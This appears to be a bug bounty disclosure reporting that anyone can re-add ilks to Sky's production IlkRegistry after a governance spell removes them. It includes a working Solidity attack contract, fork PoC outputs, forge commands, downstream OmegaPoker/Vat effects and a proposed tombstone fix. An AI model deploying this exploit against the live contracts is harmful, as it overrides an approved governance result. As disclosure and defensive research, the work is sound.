# Permissionless IlkRegistry re-add atomically reverses governance-finalized offboarding and propagates into OmegaPoker/Vat

## Severity

**Submitted severity:** Critical

**Selected in-scope impact:**

> Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Vulnerable component

- Production contract: `IlkRegistry`
- Address: `0x5a464C28D19848f44199D003BeF5ecc87d090F87`
- Source: `sky-ecosystem/ilk-registry/src/IlkRegistry.sol`
- Network: Ethereum mainnet
- Testing method: local mainnet forks only

## Summary

The production IlkRegistry uses the same state transition for two semantically different lifecycle operations:

1. temporary authorized removal followed by re-addition during metadata/module refresh; and
2. authorized removal intended to finalize collateral offboarding.

`removeAuth(ilk)` deletes the record, but the contract stores no governance-controlled terminal/tombstoned state. Any account can later call permissionless `add(address)` with the legacy Join adapter while the adapter remains a Vat ward and the old Spotter/liquidation pointers remain configured.

This allows an unprivileged account to execute a real approved governance spell and reverse 31 of its 42 IlkRegistry removals before the same transaction returns. The spell reports `done == true`, but the final Registry state materially differs from the approved cleanup result.

The behavior remains exploitable at pinned current block `25,694,337`, where all 31 legacy adapters are still individually accepted by production `add()`. The restored records are then consumed by deployed OmegaPoker, expanding its cached work set and causing `Vat.spot` changes for 15 retired ilks.

## Root cause

`add(address)` validates technical adapter state but not governance lifecycle state. In simplified form:

```solidity
function add(address adapter) external {
    JoinLike join = JoinLike(adapter);
    require(join.vat() == vat, "IlkRegistry/invalid-vat");
    require(VatLike(vat).wards(adapter) == 1, "IlkRegistry/adapter-not-authorized");

    bytes32 ilk = join.ilk();
    require(ilkData[ilk].class == 0, "IlkRegistry/ilk-already-exists");

    // Requires residual oracle and liquidation pointers.
    // No terminal-offboarding/tombstone check.
    // No Join.live() check.

    _add(adapter);
}
```

The official tests include `removeAuth -> add`, confirming temporary refresh as an intended use case. The vulnerability is not that all re-additions are invalid. The vulnerability is that the contract cannot represent the different terminal meaning of an offboarding removal.

## Governance baseline

The August 7, 2025 executive proposal stated that selected offboarded ilks would be removed from IlkRegistry to finalize offboarding.

Real spell:

```text
0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5
```

Fork block:

```text
23,118,263
```

This is one block before the real cast.

Clean execution:

```text
pre-cast Registry count: 72
post-cast Registry count: 30
removed records: 42
spell.done(): true
```

## Attack path

After the governance delay, `cast()` is public. An unprivileged helper can execute the legitimate spell and permissionless re-additions in one transaction:

```solidity
contract AtomicCleanupReversal {
    function castAndRestore(
        address spell,
        address registry,
        address[] calldata adapters
    ) external returns (uint256 restored) {
        DssSpellLike(spell).cast();

        for (uint256 i = 0; i < adapters.length; i++) {
            if (adapters[i] == address(0)) continue;
            (bool ok,) = registry.call(
                abi.encodeWithSignature("add(address)", adapters[i])
            );
            if (ok) restored++;
        }
    }
}
```

No malicious governance proposal, privileged key, miner cooperation, or probabilistic front-running is required.

## Primary PoC result: atomic reversal of the real approved spell

Test:

```text
src/IlkRegistryAtomicGovernanceReversal.t.sol
```

Machine result:

```text
[PASS] testOneUnprivilegedTransactionCastsSpellAndReversesCleanup()
spell done true
Join-backed cleanup targets 41
restored atomically 31
final registry count 61
atomic call gas used 9,535,907
block gas limit 44,868,168
```

Expected governance result:

```text
72 -> 30
```

Attacker-controlled transaction result:

```text
72 -> legitimate spell -> 30 -> permissionless re-add -> 61
```

Representative assertions prove that `AAVE-A`, `USDC-A`, and `ZRX-A` are already registered again before control returns to the external caller.

## Current-state reproducibility

Test:

```text
src/IlkRegistryCurrentMassReAdd.t.sol
```

Pinned block:

```text
25,694,337
```

Results:

```text
initial Registry count: 35
successful additions: 31 / 31
post-attack Registry count: 66
all adapters live: yes
all adapters Vat-authorized: yes
restored with non-zero Art or line: 0
```

Each target is asserted individually to be absent before addition and present afterward with non-zero oracle and auction pointers.

### Negative control for residual debt

`RWA012-A` and `RWA013-A` each have residual `Art == 1`, but both production additions revert with:

```text
IlkRegistry/invalid-auction-contract
```

Residual-debt restoration is therefore not claimed.

## Deployed downstream impact

Test:

```text
src/IlkRegistryOmegaPokerImpact.t.sol
```

Deployed consumer:

```text
OmegaPoker: 0xDd538C362dF996727054AC8Fb67ef5394eC9b8b9
```

OmegaPoker consumes `registry.list()` in `refresh()` and subsequently invokes cached oracle and Spotter paths in `poke()`.

Differential fork result:

```text
Registry count:                  35 -> 66
OmegaPoker ilk count:            12 -> 38
OmegaPoker OSM count:             7 -> 32
restored legacy ilks cached:           26
refresh gas:                 775,934 -> 2,329,157
poke gas:                    600,720 -> 2,145,661
legacy Vat.spot values changed:       15
legacy Vat.spot values non-zero:      31
```

The 15 changed `Vat.spot` entries are:

```text
CRVV1ETHSTETH-A
GNO-A
KNC-A
LINK-A
RENBTC-A
UNIV2AAVEETH-A
UNIV2DAIETH-A
UNIV2DAIUSDT-A
UNIV2ETHUSDT-A
UNIV2LINKETH-A
UNIV2UNIETH-A
UNIV2USDCETH-A
UNIV2WBTCDAI-A
UNIV2WBTCETH-A
USDT-A
```

This demonstrates on-chain propagation beyond Registry enumeration. Since all positively restored ilks have `line == 0`, I do not claim that these spot updates reopen borrowing or create liquidations.

## Persistence

After restoration, an unprivileged caller cannot remove the 31 entries because their Join adapters remain live:

```text
restored entries: 31
public removals blocked by live joins: 31
Registry count after removal attempts: 66
```

The poisoned state persists until another privileged governance action.

## Why obvious companion actions are insufficient

### Caging the Join

Caging alone does not block `add()` because `add()` does not check `Join.live()`:

```text
cage -> add -> remove -> add
```

The cycle succeeds on a fork.

### Denying the Join in Vat

`Vat.deny(join)` blocks Registry addition, but `GemJoin.exit()` relies on the same Vat authorization through `Vat.slip` and reverts with `Vat/not-authorized` afterward.

At the pinned current state, the AAVE Join held approximately:

```text
77.033778046632910564 AAVE
```

Therefore denying every legacy Join is not a universal mitigation that safely preserves collateral exit.

I do not claim governance is unable to repair the issue. A new privileged spell can implement a terminal block or perform collateral-specific cleanup. The issue is that the original authorized removal did not create a terminal state.

## Impact

The objective governance-result deviation is:

```text
approved clean state: 30 Registry records
unprivileged final state: 61 Registry records
spell.done(): true in both cases
```

The unprivileged final state is not merely displayed differently. It is consumed by deployed OmegaPoker and produces state changes in core Vat metadata.

The report does **not** claim:

- theft of funds;
- protocol insolvency;
- debt reopening;
- residual-debt RWA re-addition;
- keeper payment extraction;
- block-gas denial of service; or
- malicious replacement of a Join with a different gem.

## Reproduction

Prerequisites:

- Foundry;
- an archive-capable Ethereum RPC;
- repository branch `audit/ilk-registry-readd-proof`.

Example commands:

```bash
export ETH_RPC_URL='<ARCHIVE_RPC>'

forge build

forge test \
  --match-path src/IlkRegistryAtomicGovernanceReversal.t.sol \
  --match-test testOneUnprivilegedTransactionCastsSpellAndReversesCleanup \
  -vvvv

forge test \
  --match-path src/IlkRegistryCurrentMassReAdd.t.sol \
  -vvvv

forge test \
  --match-path src/IlkRegistryOmegaPokerImpact.t.sol \
  --match-test testMassReAddChangesDeployedOmegaPokerExecution \
  -vvvv

forge test \
  --match-path src/IlkRegistryPersistence.t.sol \
  -vvvv
```

All state-changing tests run only on local mainnet forks.

## Recommended remediation

A `Join.live()` check alone is insufficient because the 31 affected adapters are currently live to preserve exit.

Introduce a governance-controlled terminal tombstone:

```solidity
mapping(bytes32 => bool) public blocked;

function blockIlk(bytes32 ilk) external auth {
    blocked[ilk] = true;
    if (ilkData[ilk].class != 0) _remove(ilk);
}

function unblockIlk(bytes32 ilk) external auth {
    blocked[ilk] = false;
}

function add(address adapter) external {
    bytes32 ilk = JoinLike(adapter).ilk();
    require(!blocked[ilk], "IlkRegistry/ilk-blocked");
    // existing validation
}
```

Terminal offboarding spells should call `blockIlk`. Temporary technical refreshes may continue using `removeAuth -> add` after governance explicitly leaves the tombstone unset.

Separately harden `_remove` with existence and array/mapping consistency checks, and consider enforcing the documented active-adapter condition where compatible with intended lifecycle behavior.

## Evidence index

- Atomic real-spell reversal: workflow run `31082020451`
- Historical mass restoration: workflow run `31079596605`
- Current pinned restoration: workflow run `31080086181` plus the canonical validation workflow
- Persistence and mitigation tests: workflow run `31081065745`
- Keeper bounded-impact test: workflow run `31080500141`
- OmegaPoker standard-compiler proof: workflow run `31084333998`
- OmegaPoker exact `Vat.spot` deltas: workflow run `31084770021`
